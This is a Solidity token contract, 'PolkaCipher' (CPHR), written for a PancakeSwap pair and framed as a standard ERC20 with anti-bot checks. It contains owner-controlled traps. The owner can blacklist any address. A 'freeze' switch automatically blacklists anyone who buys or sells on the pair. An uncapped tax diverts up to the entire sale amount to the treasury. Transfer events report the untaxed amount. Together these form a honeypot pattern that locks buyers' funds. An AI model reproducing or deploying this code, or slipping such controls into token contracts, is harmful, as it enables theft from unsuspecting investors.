// File: contracts/Token.sol

pragma solidity ^0.8.0;

interface IPancakePair {
    function getReserves()
        external
        view
        returns (
            uint112,
            uint112,
            uint32
        );
}

contract CPHR is Context, Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private _whitelist;
    address private _liquidity;
    bool private _freeze;
    uint256 private _liquidityAdded;
    uint256 private _tax;
    bool private _tokenOrder;
    address private _treasury;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor() {
        _name = "PolkaCipher";
        _symbol = "CPHR";
        _treasury = msg.sender;
        setWhitelist(address(this), true);
        setWhitelist(msg.sender, true);
        _mint(msg.sender, 1e27);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function blacklist(address account) public view virtual returns (bool) {
        return _blacklist[account];
    }

    function whitelist(address account) public view virtual returns (bool) {
        return _whitelist[account];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 deficit;
        require(!_blacklist[sender], "BOTS Play Fair!");
        if (!(_whitelist[sender] || _whitelist[recipient])) {
            if (_freeze) {
                if (recipient == _liquidity) {
                    _blacklist[sender] = true;
                } else if (sender == _liquidity) {
                    _blacklist[recipient] = true;
                }
            }
            if (recipient == _liquidity) {
                if (block.timestamp < _liquidityAdded + 300) {
                    (uint112 _reserve0, uint112 _reserve1, ) = IPancakePair(
                        _liquidity
                    ).getReserves();
                    uint256 limit;
                    if (_tokenOrder) {
                        limit =
                            (uint256(_reserve0) * 1e18) /
                            uint256(_reserve1);
                    } else {
                        limit =
                            (uint256(_reserve1) * 1e18) /
                            uint256(_reserve0);
                    }
                    require(amount < limit, "BOTS Play Fair!");
                }
            }
            if (_tax > 0 && recipient == _liquidity) {
                deficit = (amount / 10000) * _tax;
                _balances[_treasury] += deficit;
            }
        }

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount - deficit;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function setBlacklist(address account, bool allow)
        public
        virtual
        onlyOwner
    {
        _blacklist[account] = allow;
    }

    function setName(string memory name_) public virtual onlyOwner {
        _name = name_;
    }

    function setWhitelist(address account, bool allow)
        public
        virtual
        onlyOwner
    {
        _whitelist[account] = allow;
    }

    function freeze() public virtual onlyOwner {
        _freeze = true;
    }

    function unfreeze() public virtual onlyOwner {
        _freeze = false;
    }

    function setLiquidityAddress(address account) public virtual onlyOwner {
        _liquidity = account;
    }

    function setLiquidityOrder(bool tokenOrder) public virtual onlyOwner {
        _liquidityAdded = block.timestamp;
        _tokenOrder = tokenOrder;
    }

    function transferTreasury(address account) public virtual {
        require(_msgSender() == _treasury, "Treasury wut?");
        _treasury = account;
    }

    function setTax(uint256 tax) public virtual onlyOwner {
        _tax = tax;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
